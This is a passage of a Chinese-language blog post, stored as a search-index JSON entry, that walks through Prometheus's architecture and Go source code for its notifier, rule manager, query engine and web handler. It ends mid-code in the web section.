[{"title":"Prometheus 架构和源码学习","url":"/2020/02/18/prometheus原理介绍/","content":"\n\n# Prometheus 架构和源码\n\n## Prometheus架构\n\n![architecture.png](http://www.aneasystone.com/usr/uploads/2018/10/4197609471.png)\n\n##  构成部分\n\nprometheus源码分析（prometheus基于版本2.1.0和alertmanager版本0.8.0）：\n\n1. notifier\n2. ruleManager\n3. queryengine\n4. web\n5. discovermanager\n6. scrapeManager\n7. localstorage/remotestorage\n8. alertManager\n9. pushgateway\n\n各个组件的构成结构图：\n\n![1572413613743](/images/1572413613743.png)\n\n\n\n## Notifier\n\nnotifier 组件用于告警通知，在完成初始化后，notifier组件内部会构建一个告警通知队列，队列的大小由命令行参数--alertmanager.notification-queue-capacity确定，默认值为10000 ，且告警信息通过sendAlerts方法发送给AlertManager 。\n\n初始化notifier组件：\n\n```go\nnotifier               = notifier.New(&cfg.notifier, log.With(logger, \"component\", \"notifier\"))\n```\n\nnotifier将规则触发的告警信息AlertManagers服务组的过程，通知管理服务由发现AlertManager服务，注册notifier和notifier服务组成。\n\n发现alertManager服务（discoveryManagerScrape）的逻辑与发现scrape服务（discoveryManagerNotify）的逻辑是一样的，\n\n如果将alertmanager组件结合，那么服务发现的类型就是static_configs\n\n初始化的过程中会完成对rulemanager和notifier组件的构造，同时notifier会通过sendAlerts向ruleManager回调注册。\n\n启动notifier服务：\n\n1.构建notifier结构实列\n\n2.加载系统配置\n\n3.启动notifier\n\nnotifier服务结构：\n\n```go\n// Notifier is responsible for dispatching alert notifications to an\n// alert manager service.\ntype Notifier struct {\n\tqueue []*Alert\n\topts  *Options\n\n\tmetrics *alertMetrics\n\n\tmore   chan struct{}\n\tmtx    sync.RWMutex\n\tctx    context.Context\n\tcancel func()\n\n\talertmanagers map[string]*alertmanagerSet\n\tlogger        log.Logger\n}\n```\n\nnotifier实列使用New方法来实现，处理逻辑：\n\n1. QueueCapacity的大小构建告警信息缓存队列，QueueCapacity的大小使用命令行启动参数--alertmanager.notification-queue-capacity指定\n2. context协同控制notifier服务\n3. 注册notifier服务指标：告警缓存队列大小，告警信息长度，告警地址个书，丢弃的告警信息个数\n\n```go\n// New constructs a new Notifier.\nfunc New(o *Options, logger log.Logger) *Notifier {\n\tctx, cancel := context.WithCancel(context.Background())\n\n\tif o.Do == nil {\n\t\to.Do = ctxhttp.Do\n\t}\n\tif logger == nil {\n\t\tlogger = log.NewNopLogger()\n\t}\n\n\tn := &Notifier{\n\t\tqueue:  make([]*Alert, 0, o.QueueCapacity),\n\t\tctx:    ctx,\n\t\tcancel: cancel,\n\t\tmore:   make(chan struct{}, 1),\n\t\topts:   o,\n\t\tlogger: logger,\n\t}\n\n\tqueueLenFunc := func() float64 { return float64(n.queueLen()) }\n\talertmanagersDiscoveredFunc := func() float64 { return float64(len(n.Alertmanagers())) }\n\n\tn.metrics = newAlertMetrics(\n\t\to.Registerer,\n\t\to.QueueCapacity,\n\t\tqueueLenFunc,\n\t\talertmanagersDiscoveredFunc,\n\t)\n\n\treturn n\n}\n```\n\nnewAlertMetrics是将notifier服务指标注册到prometheus系统的具体实现：\n\n```go\nfunc newAlertMetrics(r prometheus.Registerer, queueCap int, queueLen, alertmanagersDiscovered func() float64) *alertMetrics {\n\tm := &alertMetrics{\n\t\tlatency: prometheus.NewSummaryVec(prometheus.SummaryOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"latency_seconds\",\n\t\t\tHelp:      \"Latency quantiles for sending alert notifications (not including dropped notifications).\",\n\t\t},\n\t\t\t[]string{alertmanagerLabel},\n\t\t),\n\t\terrors: prometheus.NewCounterVec(prometheus.CounterOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"errors_total\",\n\t\t\tHelp:      \"Total number of errors sending alert notifications.\",\n\t\t},\n\t\t\t[]string{alertmanagerLabel},\n\t\t),\n\t\tsent: prometheus.NewCounterVec(prometheus.CounterOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"sent_total\",\n\t\t\tHelp:      \"Total number of alerts successfully sent.\",\n\t\t},\n\t\t\t[]string{alertmanagerLabel},\n\t\t),\n\t\tdropped: prometheus.NewCounter(prometheus.CounterOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"dropped_total\",\n\t\t\tHelp:      \"Total number of alerts dropped due to errors when sending to Alertmanager.\",\n\t\t}),\n\t\tqueueLength: prometheus.NewGaugeFunc(prometheus.GaugeOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"queue_length\",\n\t\t\tHelp:      \"The number of alert notifications in the queue.\",\n\t\t}, queueLen),\n\t\tqueueCapacity: prometheus.NewGauge(prometheus.GaugeOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"queue_capacity\",\n\t\t\tHelp:      \"The capacity of the alert notifications queue.\",\n\t\t}),\n\t\talertmanagersDiscovered: prometheus.NewGaugeFunc(prometheus.GaugeOpts{\n\t\t\tName: \"prometheus_notifications_alertmanagers_discovered\",\n\t\t\tHelp: \"The number of alertmanagers discovered and active.\",\n\t\t}, alertmanagersDiscovered),\n\t}\n\n\tm.queueCapacity.Set(float64(queueCap))\n\n\tif r != nil {\n\t\tr.MustRegister(\n\t\t\tm.latency,\n\t\t\tm.errors,\n\t\t\tm.sent,\n\t\t\tm.dropped,\n\t\t\tm.queueLength,\n\t\t\tm.queueCapacity,\n\t\t\tm.alertmanagersDiscovered,\n\t\t)\n\t}\n\n\treturn m\n}\n```\n\n加载服务配置：\n\n加载系统的配置过程，notifier服务会从prometheus.yml中获取external_labels, alert_relabel_configs和告警服务配置信息，将其保存到alertmanager中，告警触发的时候，根据external_labels,alert_relabel_configs的规则添加，重置对应的label，更具告警服务信息完成告警的信息发送。\n\n```go\n\n// ApplyConfig updates the status state as the new config requires.\nfunc (n *Notifier) ApplyConfig(conf *config.Config) error {\n\tn.mtx.Lock()\n\tdefer n.mtx.Unlock()\n\n\tn.opts.ExternalLabels = conf.GlobalConfig.ExternalLabels\n\tn.opts.RelabelConfigs = conf.AlertingConfig.AlertRelabelConfigs\n\n\tamSets := make(map[string]*alertmanagerSet)\n\n\tfor _, cfg := range conf.AlertingConfig.AlertmanagerConfigs {\n\t\tams, err := newAlertmanagerSet(cfg, n.logger)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\tams.metrics = n.metrics\n\n\t\t// The config hash is used for the map lookup identifier.\n\t\tb, err := json.Marshal(cfg)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tamSets[fmt.Sprintf(\"%x\", md5.Sum(b))] = ams\n\t}\n\n\tn.alertmanagers = amSets\n\n\treturn nil\n}\n```\n\nnewAlertmanagerSet方法会根据告警服务的配置信息构建alertmanagerSet结构实列，告警服务对应的ams还是初始化空列表\n\n```go\n// alertmanagerSet contains a set of Alertmanagers discovered via a group of service\n// discovery definitions that have a common configuration on how alerts should be sent.\ntype alertmanagerSet struct {\n\tcfg    *config.AlertmanagerConfig\n\tclient *http.Client\n\n\tmetrics *alertMetrics\n\n\tmtx    sync.RWMutex\n\tams    []alertmanager\n\tlogger log.Logger\n}\n```\n\n初始化函数：\n\n```go\nfunc newAlertmanagerSet(cfg *config.AlertmanagerConfig, logger log.Logger) (*alertmanagerSet, error) {\n\tclient, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, \"alertmanager\")\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\ts := &alertmanagerSet{\n\t\tclient: client,\n\t\tcfg:    cfg,\n\t\tlogger: logger,\n\t}\n\treturn s, nil\n}\n```\n\n启动notifier服务：\n\n```go\n// Run dispatches notifications continuously.\nfunc (n *Notifier) Run(tsets <-chan map[string][]*targetgroup.Group) {\n\n\tfor {\n\t\tselect {\n\t\tcase <-n.ctx.Done():\n\t\t\treturn\n\t\tcase ts := <-tsets:\n\t\t\tn.reload(ts)\n\t\tcase <-n.more:\n\t\t}\n\t\talerts := n.nextBatch()\n\n\t\tif !n.sendAll(alerts...) {\n\t\t\tn.metrics.dropped.Add(float64(len(alerts)))\n\t\t}\n\t\t// If the queue still has items left, kick off the next iteration.\n\t\tif n.queueLen() > 0 {\n\t\t\tn.setMore()\n\t\t}\n\t}\n}\n```\n\n服务收到更新信号调用reload方法，将告警服务ts放入reload方法中，更新服务目标服务信息。\n\nscrape发现服务以job_name为单元，notifier发现服务以告警服务为单元，告警服务作用域所有的job_name.\n\n```go\nfunc (n *Notifier) reload(tgs map[string][]*targetgroup.Group) {\n\tn.mtx.Lock()\n\tdefer n.mtx.Unlock()\n\n\tfor id, tgroup := range tgs {\n\t\tam, ok := n.alertmanagers[id]\n\t\tif !ok {\n\t\t\tlevel.Error(n.logger).Log(\"msg\", \"couldn't sync alert manager set\", \"err\", fmt.Sprintf(\"invalid id:%v\", id))\n\t\t\tcontinue\n\t\t}\n\t\tam.sync(tgroup)\n\t}\n}\n```\n\n调用sync方法，同步告警服务信息\n\n```go\n// sync extracts a deduplicated set of Alertmanager endpoints from a list\n// of target groups definitions.\nfunc (s *alertmanagerSet) sync(tgs []*targetgroup.Group) {\n\tall := []alertmanager{}\n\n\tfor _, tg := range tgs {\n\t\tams, err := alertmanagerFromGroup(tg, s.cfg)\n\t\tif err != nil {\n\t\t\tlevel.Error(s.logger).Log(\"msg\", \"Creating discovered Alertmanagers failed\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tall = append(all, ams...)\n\t}\n\n\ts.mtx.Lock()\n\tdefer s.mtx.Unlock()\n\t// Set new Alertmanagers and deduplicate them along their unique URL.\n\ts.ams = []alertmanager{}\n\tseen := map[string]struct{}{}\n\n\tfor _, am := range all {\n\t\tus := am.url().String()\n\t\tif _, ok := seen[us]; ok {\n\t\t\tcontinue\n\t\t}\n\n\t\t// This will initialise the Counters for the AM to 0.\n\t\ts.metrics.sent.WithLabelValues(us)\n\t\ts.metrics.errors.WithLabelValues(us)\n\t\t//根据URL地址构建唯一键值，\n\t\tseen[us] = struct{}{}\n        //保存alertmanager\n\t\ts.ams = append(s.ams, am)\n\t}\n}\n```\n\nalertmanagerFromGroup 方法中将对告警信息的label 进行整理，包括__address__, __alerts_path__ 和 __scheme__，每个实列的内容都为告警服务的URL地址。\n\nsendAll方法，发送告警到所有配置的alertmanagers，当至少一个alertmanager成功，返回成功。\n\n```go\n// sendAll sends the alerts to all configured Alertmanagers concurrently.\n// It returns true if the alerts could be sent successfully to at least one Alertmanager.\nfunc (n *Notifier) sendAll(alerts ...*Alert) bool {\n\tbegin := time.Now()\n\n\tb, err := json.Marshal(alerts)\n\tif err != nil {\n\t\tlevel.Error(n.logger).Log(\"msg\", \"Encoding alerts failed\", \"err\", err)\n\t\treturn false\n\t}\n\n\tn.mtx.RLock()\n\tamSets := n.alertmanagers\n\tn.mtx.RUnlock()\n\n\tvar (\n\t\twg         sync.WaitGroup\n\t\tnumSuccess uint64\n\t)\n\tfor _, ams := range amSets {\n\t\tams.mtx.RLock()\n\n\t\tfor _, am := range ams.ams {\n\t\t\twg.Add(1)\n\n\t\t\tctx, cancel := context.WithTimeout(n.ctx, ams.cfg.Timeout)\n\t\t\tdefer cancel()\n\n\t\t\tgo func(ams *alertmanagerSet, am alertmanager) {\n\t\t\t\tu := am.url().String()\n\n\t\t\t\tif err := n.sendOne(ctx, ams.client, u, b); err != nil {\n\t\t\t\t\tlevel.Error(n.logger).Log(\"alertmanager\", u, \"count\", len(alerts), \"msg\", \"Error sending alert\", \"err\", err)\n\t\t\t\t\tn.metrics.errors.WithLabelValues(u).Inc()\n\t\t\t\t} else {\n\t\t\t\t\tatomic.AddUint64(&numSuccess, 1)\n\t\t\t\t}\n\t\t\t\tn.metrics.latency.WithLabelValues(u).Observe(time.Since(begin).Seconds())\n\t\t\t\tn.metrics.sent.WithLabelValues(u).Add(float64(len(alerts)))\n\n\t\t\t\twg.Done()\n\t\t\t}(ams, am)\n\t\t}\n\t\tams.mtx.RUnlock()\n\t}\n    //发送告警同步等待\n\twg.Wait()\n\n\treturn numSuccess > 0\n}\n\n```\n\n使用sendOne发送告警信息，使用http请求的方式发送告警信息\n\n```go\nfunc (n *Notifier) sendOne(ctx context.Context, c *http.Client, url string, b []byte) error {\n\treq, err := http.NewRequest(\"POST\", url, bytes.NewReader(b))\n\tif err != nil {\n\t\treturn err\n\t}\n\treq.Header.Set(\"Content-Type\", contentTypeJSON)\n\tresp, err := n.opts.Do(ctx, c, req)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer resp.Body.Close()\n\n\t// Any HTTP status 2xx is OK.\n\tif resp.StatusCode/100 != 2 {\n\t\treturn fmt.Errorf(\"bad response status %v\", resp.Status)\n\t}\n\treturn err\n}\n```\n\nnotifier流程：\n\n![1572404957636](/images/1572404957636.png)\n\n注册notifier:\n\n初始化过程中将notifier服务注册到rulemanager中，规则运算过程中触发告警，会调用注册的sendAlerts方法完成告警信息发送。\n\n告警状态分为三种：StateInactive（告警活动状态），StatePending (告警待定状态)，StateFiring(告警激活状态)。\n\n```go\n// sendAlerts implements a the rules.NotifyFunc for a Notifier.\n// It filters any non-firing alerts from the input.\nfunc sendAlerts(n *notifier.Notifier, externalURL string) rules.NotifyFunc {\n\treturn func(ctx context.Context, expr string, alerts ...*rules.Alert) error {\n\t\tvar res []*notifier.Alert\n\n\t\tfor _, alert := range alerts {\n\t\t\t// Only send actually firing alerts.\n\t\t\tif alert.State == rules.StatePending {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\ta := &notifier.Alert{\n\t\t\t\tStartsAt:     alert.FiredAt,\n\t\t\t\tLabels:       alert.Labels,\n\t\t\t\tAnnotations:  alert.Annotations,\n\t\t\t\tGeneratorURL: externalURL + strutil.TableLinkForExpression(expr),\n\t\t\t}\n\t\t\tif !alert.ResolvedAt.IsZero() {\n\t\t\t\ta.EndsAt = alert.ResolvedAt\n\t\t\t}\n\t\t\tres = append(res, a)\n\t\t}\n\n\t\tif len(alerts) > 0 {\n\t\t\tn.Send(res...)\n\t\t}\n\t\treturn nil\n\t}\n}\n```\n\n告警信息alerts通过notifier.Send方法添加到告警队列中，在添加之前需要对告警信息的label进行扩展和重置。\n\n```go\n// Send queues the given notification requests for processing.\n// Panics if called on a handler that is not running.\nfunc (n *Notifier) Send(alerts ...*Alert) {\n\tn.mtx.Lock()\n\tdefer n.mtx.Unlock()\n\n\t// Attach external labels before relabelling and sending.\n\tfor _, a := range alerts {\n\t\tlb := labels.NewBuilder(a.Labels)\n\n\t\tfor ln, lv := range n.opts.ExternalLabels {\n\t\t\tif a.Labels.Get(string(ln)) == \"\" {\n\t\t\t\tlb.Set(string(ln), string(lv))\n\t\t\t}\n\t\t}\n\n\t\ta.Labels = lb.Labels()\n\t}\n\n\talerts = n.relabelAlerts(alerts)\n\n\t// Queue capacity should be significantly larger than a single alert\n\t// batch could be.\n\tif d := len(alerts) - n.opts.QueueCapacity; d > 0 {\n\t\talerts = alerts[d:]\n\n\t\tlevel.Warn(n.logger).Log(\"msg\", \"Alert batch larger than queue capacity, dropping alerts\", \"num_dropped\", d)\n\t\tn.metrics.dropped.Add(float64(d))\n\t}\n\n\t// If the queue is full, remove the oldest alerts in favor\n\t// of newer ones.\n\tif d := (len(n.queue) + len(alerts)) - n.opts.QueueCapacity; d > 0 {\n\t\tn.queue = n.queue[d:]\n\n\t\tlevel.Warn(n.logger).Log(\"msg\", \"Alert notification queue full, dropping alerts\", \"num_dropped\", d)\n\t\tn.metrics.dropped.Add(float64(d))\n\t}\n\tn.queue = append(n.queue, alerts...)\n\n\t// Notify sending goroutine that there are alerts to be processed.\n\tn.setMore()\n}\n```\n\n主要的流程图：\n\n![1572406923577](/images/1572406923577.png)\n\n\n\n## RuleManager\n\nruleManager在prometheus初始化阶段调用rules.NewManager方法完成构建，ruleManager为Manager类型：\n\n```go\n// The Manager manages recording and alerting rules.\ntype Manager struct {\n\topts   *ManagerOptions\n\tgroups map[string]*Group\n\tmtx    sync.RWMutex\n\tblock  chan struct{}\n\n\tlogger log.Logger\n}\n```\n\ngroups为map[string]*Group类型，key为规则组名，Group为具体的规则信息。\n\nGroup结构定义如下：\n\n```go\n// Group is a set of rules that have a logical relation.\ntype Group struct {\n\tname                 string\n\tfile                 string\n\tinterval             time.Duration\n\trules                []Rule\n\tseriesInPreviousEval []map[string]labels.Labels // One per Rule.\n\topts                 *ManagerOptions\n\tevaluationTime       time.Duration\n\tmtx                  sync.Mutex\n\n\tdone       chan struct{}\n\tterminated chan struct{}\n\n\tlogger log.Logger\n}\n```\n\n更新规则：\n\n```go\n// Update the rule manager's state as the config requires. If\n// loading the new rules failed the old rule set is restored.\nfunc (m *Manager) Update(interval time.Duration, files []string) error {\n\tm.mtx.Lock()\n\tdefer m.mtx.Unlock()\n\n\t// To be replaced with a configurable per-group interval.\n\tgroups, errs := m.loadGroups(interval, files...)\n\tif errs != nil {\n\t\tfor _, e := range errs {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"loading groups failed\", \"err\", e)\n\t\t}\n\t\treturn errors.New(\"error loading rules, previous rule set restored\")\n\t}\n\n\tvar wg sync.WaitGroup\n\n\tfor _, newg := range groups {\n\t\twg.Add(1)\n\n\t\t// If there is an old group with the same identifier, stop it and wait for\n\t\t// it to finish the current iteration. Then copy it into the new group.\n\t\tgn := groupKey(newg.name, newg.file)\n\t\toldg, ok := m.groups[gn]\n\t\tdelete(m.groups, gn)\n\n\t\tgo func(newg *Group) {\n\t\t\tif ok {\n\t\t\t\toldg.stop()\n\t\t\t\tnewg.copyState(oldg)\n\t\t\t}\n\t\t\tgo func() {\n\t\t\t\t// Wait with starting evaluation until the rule manager\n\t\t\t\t// is told to run. This is necessary to avoid running\n\t\t\t\t// queries against a bootstrapping storage.\n\t\t\t\t<-m.block\n\t\t\t\tnewg.run(m.opts.Context)\n\t\t\t}()\n\t\t\twg.Done()\n\t\t}(newg)\n\t}\n\n\t// Stop remaining old groups.\n\tfor _, oldg := range m.groups {\n\t\toldg.stop()\n\t}\n\n\twg.Wait()\n\tm.groups = groups\n\n\treturn nil\n}\n```\n\n 规则组状态复制Group.copyState指从源规则组中，将与目标规则组相同规则名称下的指标赋值给对应的目标规则，将源规则组处于活跃状态下的指标赋值到目标规则组的活跃区域。\n\n```go\n// copyState copies the alerting rule and staleness related state from the given group.\n//\n// Rules are matched based on their name. If there are duplicates, the\n// first is matched with the first, second with the second etc.\nfunc (g *Group) copyState(from *Group) {\n\tg.evaluationTime = from.evaluationTime\n\n\truleMap := make(map[string][]int, len(from.rules))\n\n\tfor fi, fromRule := range from.rules {\n\t\tl, _ := ruleMap[fromRule.Name()]\n\t\truleMap[fromRule.Name()] = append(l, fi)\n\t}\n\n\tfor i, rule := range g.rules {\n\t\tindexes, _ := ruleMap[rule.Name()]\n\t\tif len(indexes) == 0 {\n\t\t\tcontinue\n\t\t}\n\t\tfi := indexes[0]\n\t\tg.seriesInPreviousEval[i] = from.seriesInPreviousEval[fi]\n\t\truleMap[rule.Name()] = indexes[1:]\n\n\t\tar, ok := rule.(*AlertingRule)\n\t\tif !ok {\n\t\t\tcontinue\n\t\t}\n\t\tfar, ok := from.rules[fi].(*AlertingRule)\n\t\tif !ok {\n\t\t\tcontinue\n\t\t}\n\n\t\tfor fp, a := range far.active {\n\t\t\tar.active[fp] = a\n\t\t}\n\t}\n}\n```\n\n规则组启动流程：进入 run  方法后先进行初始化等待，以使得规则运算的时间间隔interval对齐。定义规则运算调度方法iter, 调度收起interval指定；iter方法中调用eval方法。\n\n```go\nfunc (g *Group) run(ctx context.Context) {\n\tdefer close(g.terminated)\n\n\t// Wait an initial amount to have consistently slotted intervals.\n\tselect {\n\tcase <-time.After(g.offset()):\n\tcase <-g.done:\n\t\treturn\n\t}\n\n\titer := func() {\n\t\titerationsScheduled.Inc()\n\n\t\tstart := time.Now()\n\t\tg.Eval(ctx, start)\n\n\t\titerationDuration.Observe(time.Since(start).Seconds())\n\t\tg.SetEvaluationTime(time.Since(start))\n\t}\n\tlastTriggered := time.Now()\n\titer()\n\n\ttick := time.NewTicker(g.interval)\n\tdefer tick.Stop()\n\n\tfor {\n\t\tselect {\n\t\tcase <-g.done:\n\t\t\treturn\n\t\tdefault:\n\t\t\tselect {\n\t\t\tcase <-g.done:\n\t\t\t\treturn\n\t\t\tcase <-tick.C:\n\t\t\t\tmissed := (time.Since(lastTriggered).Nanoseconds() / g.interval.Nanoseconds()) - 1\n\t\t\t\tif missed > 0 {\n\t\t\t\t\titerationsMissed.Add(float64(missed))\n\t\t\t\t\titerationsScheduled.Add(float64(missed))\n\t\t\t\t}\n\t\t\t\tlastTriggered = time.Now()\n\t\t\t\titer()\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n规则组的调度在Eval中实现，Eval方法会将规则组中的每个规则一次放到queryEngine中执行，如果呗执行的规则是AlertingRule类型，执行后结果指标会通过notifier组件发送给告警服务，最后将结果指标存储到prometheus的存储管理器，并对过期指标进行存储标记处理。\n\n```go\n// Eval runs a single evaluation cycle in which all rules are evaluated sequentially.\nfunc (g *Group) Eval(ctx context.Context, ts time.Time) {\n\tfor i, rule := range g.rules {\n\t\tselect {\n\t\tcase <-g.done:\n\t\t\treturn\n\t\tdefault:\n\t\t}\n\n\t\tfunc(i int, rule Rule) {\n\t\t\tdefer func(t time.Time) {\n\t\t\t\tevalDuration.Observe(time.Since(t).Seconds())\n\t\t\t\trule.SetEvaluationTime(time.Since(t))\n\t\t\t}(time.Now())\n\n\t\t\tevalTotal.Inc()\n\n\t\t\tvector, err := rule.Eval(ctx, ts, g.opts.QueryFunc, g.opts.ExternalURL)\n\t\t\tif err != nil {\n\t\t\t\t// Canceled queries are intentional termination of queries. This normally\n\t\t\t\t// happens on shutdown and thus we skip logging of any errors here.\n\t\t\t\tif _, ok := err.(promql.ErrQueryCanceled); !ok {\n\t\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"Evaluating rule failed\", \"rule\", rule, \"err\", err)\n\t\t\t\t}\n\t\t\t\tevalFailures.Inc()\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tif ar, ok := rule.(*AlertingRule); ok {\n\t\t\t\tg.opts.NotifyFunc(ctx, ar.vector.String(), ar.currentAlerts()...)\n\t\t\t}\n\t\t\tvar (\n\t\t\t\tnumOutOfOrder = 0\n\t\t\t\tnumDuplicates = 0\n\t\t\t)\n\n\t\t\tapp, err := g.opts.Appendable.Appender()\n\t\t\tif err != nil {\n\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"creating appender failed\", \"err\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tseriesReturned := make(map[string]labels.Labels, len(g.seriesInPreviousEval[i]))\n\t\t\tfor _, s := range vector {\n\t\t\t\tif _, err := app.Add(s.Metric, s.T, s.V); err != nil {\n\t\t\t\t\tswitch err {\n\t\t\t\t\tcase storage.ErrOutOfOrderSample:\n\t\t\t\t\t\tnumOutOfOrder++\n\t\t\t\t\t\tlevel.Debug(g.logger).Log(\"msg\", \"Rule evaluation result discarded\", \"err\", err, \"sample\", s)\n\t\t\t\t\tcase storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\t\t\tnumDuplicates++\n\t\t\t\t\t\tlevel.Debug(g.logger).Log(\"msg\", \"Rule evaluation result discarded\", \"err\", err, \"sample\", s)\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"Rule evaluation result discarded\", \"err\", err, \"sample\", s)\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tseriesReturned[s.Metric.String()] = s.Metric\n\t\t\t\t}\n\t\t\t}\n\t\t\tif numOutOfOrder > 0 {\n\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"Error on ingesting out-of-order result from rule evaluation\", \"numDropped\", numOutOfOrder)\n\t\t\t}\n\t\t\tif numDuplicates > 0 {\n\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"Error on ingesting results from rule evaluation with different value but same timestamp\", \"numDropped\", numDuplicates)\n\t\t\t}\n\n\t\t\tfor metric, lset := range g.seriesInPreviousEval[i] {\n\t\t\t\tif _, ok := seriesReturned[metric]; !ok {\n\t\t\t\t\t// Series no longer exposed, mark it stale.\n\t\t\t\t\t_, err = app.Add(lset, timestamp.FromTime(ts), math.Float64frombits(value.StaleNaN))\n\t\t\t\t\tswitch err {\n\t\t\t\t\tcase nil:\n\t\t\t\t\tcase storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\t\t\t// Do not count these in logging, as this is expected if series\n\t\t\t\t\t\t// is exposed from a different rule.\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"adding stale sample failed\", \"sample\", metric, \"err\", err)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif err := app.Commit(); err != nil {\n\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"rule sample appending failed\", \"err\", err)\n\t\t\t} else {\n\t\t\t\tg.seriesInPreviousEval[i] = seriesReturned\n\t\t\t}\n\t\t}(i, rule)\n\t}\n}\n```\n\n规则调度的流程：\n\n![1572412222861](/images/1572412222861.png)\n\n## QueryEngine\n\nqueryengine是核心模块，规则分为告警规则和记录规则，告警规则会产生告警信息，通过通知组件发送给告警服务，告警规则的计算表达式可以引用记录规则。\n\nRule接口：\n\n```go\n// A Rule encapsulates a vector expression which is evaluated at a specified\n// interval and acted upon (currently either recorded or used for alerting).\ntype Rule interface {\n\tName() string\n\t// eval evaluates the rule, including any associated recording or alerting actions.\n\tEval(context.Context, time.Time, QueryFunc, *url.URL) (promql.Vector, error)\n\t// String returns a human-readable string representation of the rule.\n\tString() string\n\n\tSetEvaluationTime(time.Duration)\n\tGetEvaluationTime() time.Duration\n\t// HTMLSnippet returns a human-readable string representation of the rule,\n\t// decorated with HTML elements for use the web frontend.\n\tHTMLSnippet(pathPrefix string) html_template.HTML\n}\n```\n\n两种规则都是通过实现Rule接口中的Eval方法来完成。\n\n1）告警状态为StatePending时候，告警持续时间必须大于等于告警规则所配置的持续时间。\n\n2）告警状态为StateFiring\n\n告警规则和记录规则Eval方法的实现代码路径为rules/alerting和reording.go\n\n查询引擎通过EngineQueryFunc方法完成了在RuleManager中的注册。\n\n```go\n// QueryFunc processes PromQL queries.\ntype QueryFunc func(ctx context.Context, q string, t time.Time) (promql.Vector, error)\n```\n\n规则在查询引擎中运算之前，需要调用Engine.NewInstantQuery方法初始化，完成对规则的解析和对查询器的构建。\n\n```go\n// NewInstantQuery returns an evaluation query for the given expression at the given time.\nfunc (ng *Engine) NewInstantQuery(qs string, ts time.Time) (Query, error) {\n\texpr, err := ParseExpr(qs)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tqry := ng.newQuery(expr, ts, ts, 0)\n\tqry.q = qs\n\n\treturn qry, nil\n}\n```\n\n规则允许的调用链为:\n\nquery.Exec->Engine.exec->Engine.execEvalStmt->evaluator.eval。最为关键的部分在evaluator.eval方法中实现。\n\n支持的表达式类型：\n\n```\nAggregateExpr\nBinaryExpr\nCall\nMatrixSelector\nNumberLiteral\nParenExpr\nStringLiteral\nUnaryExpr\nVectorSelector\n```\n\nenginequery模块主要代码在promql目录下；\n\nast.go定义查询引擎中常用的结构\n\nengine.go具体实现\n\nfunctions.go实现查询引擎的内置方法\n\nfuzz.go，parse.go实现两种各不同的表达式解析器\n\nprinter.go, quantile.go, value.go 查询引擎的公共基础方法\n\nBinaryExpr运算：\n\n![1572413062094](/images/1572413062094.png)\n\n时间窗口规则运算：\n\n![1572413083570](/images/1572413083570.png)\n\n规则计算和指标查询：\n\n查询引擎在规则运算过程中，先对规则进行解析，然后解析后的规则转换成为对应类型的表达式，最后根据转换后的表达式和数据完成规则计算。\n\n查询引擎是通过调用读写代理器fanoutStorage中的Querier方法获取指标数据的。 Querier方法的主要参数为指标名称，开始时间和结束时间。\n\n加入指标查询后的规则运算调用链为： query.Exec=>Engine.Exec=>Engine.execEvalStat=>Engine.populateIterators=>Engine.queryable.Querier=>evaluator.eval\n\n## Web\n\nweb组件引用了localStorage组件，fanoutStorage组件，scrapeManager组件，ruleManager组件和notifier组件，对外提供http服务。\n\nprometheus server服务的handler的数据结构如下：\n\n```go\n// Handler serves various HTTP endpoints of the Prometheus server\ntype Handler struct {\n\tlogger log.Logger\n\n\tscrapeManager *retrieval.ScrapeManager\n\truleManager   *rules.Manager\n\tqueryEngine   *promql.Engine\n\tcontext       context.Context\n\ttsdb          func() *tsdb.DB\n\tstorage       storage.Storage\n\tnotifier      *notifier.Notifier\n\n\tapiV1 *api_v1.API\n\n\trouter       *route.Router\n\tquitCh       chan struct{}\n\treloadCh     chan chan error\n\toptions      *Options\n\tconfig       *config.Config\n\tconfigString string\n\tversionInfo  *PrometheusVersion\n\tbirth        time.Time\n\tcwd          string\n\tflagsMap     map[string]string\n\n\texternalLabels model.LabelSet\n\tmtx            sync.RWMutex\n\tnow            func() model.Time\n\n\tready uint32 // ready is uint32 rather than boolean to be able to use atomic functions.\n}\n```\n\nweb初始化再main中：\n\n```go\nwebHandler := web.New(log.With(logger, \"component\", \"web\"), &cfg.web)\n```\n\n注册api接口：\n\n```go\nfunc New(logger log.Logger, o *Options) *Handler {\n\trouter := route.New()\n\tcwd, err := os.Getwd()\n\n\tif err != nil {\n\t\tcwd = \"<error retrieving current working directory>\"\n\t}\n\tif logger == nil {\n\t\tlogger = log.NewNopLogger()\n\t}\n\n\th := &Handler{\n\t\tlogger:      